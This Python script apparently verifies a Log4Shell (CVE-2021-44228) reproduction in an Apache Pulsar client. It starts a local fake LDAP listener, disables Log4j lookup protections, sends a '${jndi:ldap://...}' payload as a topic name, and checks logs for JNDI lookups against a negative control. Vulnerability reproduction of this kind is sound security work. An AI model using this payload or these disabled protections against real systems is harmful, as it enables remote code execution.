#!/usr/bin/env python3
import json
import os
import signal
import socket
import subprocess
import threading
import time
import zipfile
from pathlib import Path


WORK = Path("/data/lhq/workspace/source-runtime-verify/apache_pulsar__CVE-2021-44228__source_inserted")
DIST = WORK / "runtime-source/apache-pulsar-2.8.1"
SOURCE_CLASS = WORK / "classes/org/apache/pulsar/client/cli/CmdConsume.class"
TOOLS_JAR = DIST / "lib/org.apache.pulsar-pulsar-client-tools-2.8.1.jar"


def sha256(path):
    import hashlib
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1024 * 1024), b""):
            h.update(chunk)
    return h.hexdigest()


def start_ldap_listener(timeout=35):
    received = []
    ready = threading.Event()
    port_box = {}

    def worker():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("127.0.0.1", 0))
            sock.listen(5)
            sock.settimeout(timeout)
            port_box["port"] = sock.getsockname()[1]
            ready.set()
            try:
                conn, addr = sock.accept()
            except socket.timeout:
                return
            with conn:
                data = conn.recv(256)
                received.append({"addr": repr(addr), "data_hex": data.hex(), "data_repr": repr(data)})
                try:
                    conn.sendall(bytes([48, 12, 2, 1, 1, 101, 7, 10, 1, 0, 4, 0, 4, 0]))
                except OSError:
                    pass

    thread = threading.Thread(target=worker, daemon=True)
    thread.start()
    if not ready.wait(3):
        raise RuntimeError("LDAP listener did not start")
    return port_box["port"], received, thread


def run_client_case(case_name, marker, timeout=45):
    evidence_dir = WORK / "runs" / case_name
    evidence_dir.mkdir(parents=True, exist_ok=True)
    log_dir = evidence_dir / "logs"
    log_dir.mkdir(parents=True, exist_ok=True)
    stdout_path = evidence_dir / "pulsar-client.log"
    topic = f"persistent://public/default/{marker}"
    cmd = [
        str(DIST / "bin/pulsar-client"),
        "--url",
        "pulsar://127.0.0.1:1",
        "consume",
        "-s",
        "strict-subscription",
        "-n",
        "1",
        topic,
    ]
    env = os.environ.copy()
    env.update(
        {
            "JAVA_TOOL_OPTIONS": "",
            "PULSAR_LOG_DIR": str(log_dir),
            "PULSAR_LOG_APPENDER": "RollingFile",
            "PULSAR_LOG_LEVEL": "info",
            "PULSAR_ROUTING_APPENDER_DEFAULT": "RollingFile",
            "PULSAR_EXTRA_OPTS": "-Dlog4j2.formatMsgNoLookups=false -Dcom.sun.jndi.ldap.object.trustURLCodebase=true",
            "PULSAR_MEM": "-Xmx256m",
        }
    )
    started = time.time()
    with stdout_path.open("w", encoding="utf-8") as stdout:
        proc = subprocess.Popen(
            cmd,
            cwd=str(DIST),
            env=env,
            stdout=stdout,
            stderr=subprocess.STDOUT,
            text=True,
            start_new_session=True,
        )
        try:
            proc.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                proc.wait(timeout=5)
            except Exception:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
                proc.wait(timeout=5)
    stdout_text = stdout_path.read_text(encoding="utf-8", errors="replace")
    logs = []
    for path in sorted(log_dir.rglob("*.log")):
        text = path.read_text(encoding="utf-8", errors="replace")
        logs.append(
            {
                "file": str(path),
                "contains_inserted_log": "Preparing to consume from topic" in text or "Preparing to consume from topic" in stdout_text,
                "contains_cmd_consume": "org.apache.pulsar.client.cli.CmdConsume" in text,
                "contains_jndi_lookup_stack": "org.apache.logging.log4j.core.lookup.JndiLookup.lookup" in text,
                "contains_jndi_manager_stack": "org.apache.logging.log4j.core.net.JndiManager.lookup" in text,
                "contains_topic": topic in text,
                "contains_marker": marker in text,
                "tail": text[-10000:],
            }
        )
    return {
        "case": case_name,
        "cmd": cmd,
        "topic": topic,
        "marker": marker,
        "returncode": proc.poll(),
        "duration_seconds": round(time.time() - started, 3),
        "stdout_tail": stdout_text[-10000:],
        "logs": logs,
        "stdout_contains_inserted_log": "Preparing to consume from topic" in stdout_text,
        "stdout_contains_jndi_lookup_stack": "org.apache.logging.log4j.core.lookup.JndiLookup.lookup" in stdout_text,
        "stdout_contains_jndi_manager_stack": "org.apache.logging.log4j.core.net.JndiManager.lookup" in stdout_text,
    }


def class_match():
    with zipfile.ZipFile(TOOLS_JAR) as zf:
        runtime_bytes = zf.read("org/apache/pulsar/client/cli/CmdConsume.class")
    return {
        "source_class_sha256": sha256(SOURCE_CLASS),
        "runtime_class_sha256": __import__("hashlib").sha256(runtime_bytes).hexdigest(),
        "runtime_class_matches_source": runtime_bytes == SOURCE_CLASS.read_bytes(),
        "tools_jar_sha256": sha256(TOOLS_JAR),
    }


def dependency_evidence():
    jars = sorted(p.name for p in (DIST / "lib").glob("*log4j*.jar"))
    core = DIST / "lib/org.apache.logging.log4j-log4j-core-2.14.1.jar"
    result = {"log4j_jars": jars, "log4j_core_2_14_1_present": core.exists()}
    if core.exists():
        with zipfile.ZipFile(core) as zf:
            names = set(zf.namelist())
        result["jndi_lookup_class_present"] = "org/apache/logging/log4j/core/lookup/JndiLookup.class" in names
        result["jndi_manager_class_present"] = "org/apache/logging/log4j/core/net/JndiManager.class" in names
    return result


def main():
    evidence = WORK / "evidence"
    evidence.mkdir(parents=True, exist_ok=True)
    port, received, thread = start_ldap_listener()
    payload = "${jndi:ldap://127.0.0.1:%d}" % port
    positive = run_client_case("positive_cli_consume_payload", payload)
    thread.join(10)
    positive["listener_received"] = received
    positive["listener_received_count"] = len(received)

    _port, neg_received, neg_thread = start_ldap_listener()
    negative = run_client_case("negative_cli_consume_control", "strict_control_no_jndi")
    neg_thread.join(10)
    negative["listener_received"] = neg_received
    negative["listener_received_count"] = len(neg_received)

    cls = class_match()
    dep = dependency_evidence()
    positive_inserted_log = positive["stdout_contains_inserted_log"] or any(l["contains_inserted_log"] for l in positive["logs"])
    positive_jndi_stack = (
        positive["stdout_contains_jndi_lookup_stack"]
        and positive["stdout_contains_jndi_manager_stack"]
    ) or any(l["contains_jndi_lookup_stack"] and l["contains_jndi_manager_stack"] for l in positive["logs"])
    negative_inserted_log = negative["stdout_contains_inserted_log"] or any(l["contains_inserted_log"] for l in negative["logs"])
    result = {
        "sample_id": "apache_pulsar__CVE-2021-44228__source_inserted",
        "base_commit": "02ee5616866d4eda8dd94f85d9d9b71c459f248d",
        "runtime_distribution": "fallback apache-pulsar-2.8.1 runtime with source-compiled 2.8.4 CmdConsume.class injected",
        "class_evidence": cls,
        "dependency_evidence": dep,
        "positive": positive,
        "negative": negative,
        "strict_caveat": "Runtime distribution is Pulsar 2.8.1 because the official 2.8.4 archive was too slow to fetch during this run. The injected class was compiled from patched Pulsar 2.8.4 source against the 2.8.1 runtime classpath.",
    }
    result["status"] = (
        "TP_CONFIRMED_WITH_VERSION_CAVEAT"
        if cls["runtime_class_matches_source"]
        and dep.get("jndi_lookup_class_present")
        and dep.get("jndi_manager_class_present")
        and positive_inserted_log
        and positive_jndi_stack
        and positive["listener_received_count"] > 0
        and negative_inserted_log
        and negative["listener_received_count"] == 0
        else "FAILED"
    )
    (evidence / "runtime-source-verify.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n")
    (evidence / "runtime-source-run.rc").write_text(
        f"RUN_RC={0 if result['status'].startswith('TP_CONFIRMED') else 1}\n"
        f"status={result['status']}\n"
        f"positive_listener_received_count={positive['listener_received_count']}\n"
        f"negative_listener_received_count={negative['listener_received_count']}\n"
        f"runtime_class_matches_source={cls['runtime_class_matches_source']}\n"
    )
    print(json.dumps(result, indent=2, sort_keys=True))
    return 0 if result["status"].startswith("TP_CONFIRMED") else 1


if __name__ == "__main__":
    raise SystemExit(main())
